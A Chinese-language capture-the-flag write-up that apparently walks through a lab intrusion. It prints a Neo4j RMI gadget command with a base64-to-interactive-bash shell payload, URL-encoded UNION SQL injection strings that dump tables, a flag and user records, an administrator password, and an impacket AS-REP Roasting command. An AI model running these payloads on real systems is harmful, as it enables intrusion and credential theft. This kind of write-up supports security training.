搜索到有关Neo4j相关漏洞，需要开启1337端口

发现是开着的，打成功的概率还挺高
先打一波试试，不行就只能去爆破22端口，或者再做一次全端口扫描看看是否有遗漏

java -jar rhino_gadget.jar rmi:// "bash -c {echo,}|{base64,-d}|{bash,-i}"

成功，这里注意要用java1.8，大于java9会缺少类，从而打失败

但是发现万能密码会有不一样的结果

但是又登不进去，只是会有个弹框，于是就在这测试sql注入，靶场的话无需考虑，sqlmap一把梭

耗时超久，这里吧payload复制出来，有耐心的可以自己打


爆完库名到表名
limit 0,1时爆出来的是oa_admin，应该是管理员账号密码，等下再看
1，1爆出flag表
%27+UNION+SELECT+1%2Ctable_name%2C3+FROM+information_schema.tables+WHERE+table_schema%3D%27oa_db%27LIMIT+1,1–+-

读取一下列名
%27+UNION+SELECT+1%2CGROUP_CONCAT%28column_name%29%2C3+FROM+information_schema.columns+WHERE+table_name%3D%27oa_f1Agggg%27–+-

读取数据
%27+UNION+SELECT+NULL%2Cflag02%2CNULL+FROM+oa_f1Agggg+LIMIT+0%2C1–+-

成功
再回去读一下oa_admin

拿到管理员账号密码

administrator/bo2y8kAL3HnXUiQo
但是还是登不进去啊，我猜是不是还有别的表

oa_users，这里可能有喷洒的数据
%27+UNION+SELECT+NULL%2C%28SELECT+GROUP_CONCAT%28email+SEPARATOR+%27%5Cn%27%29+FROM+%28SELECT+%2A+FROM+oa_users+LIMIT+50+OFFSET+0%29tmp%29%2CNULL–+-
可以通过这个指令读取，我看了里面一共500个账户，我把email，username，phone都弄了下来，过程繁琐，不多演示

其实比较主要的是email，我们尝试使用Kerberos AS-REP Roasting攻击
这种攻击是尝试从 Active Directory 获取不需要预身份验证的用户的加密凭证信息
proxychains4 -q impacket-GetNPUsers -dc-ip 172.22.6.12 -usersfile email.txt xiaorang.lab/

爆破出两个
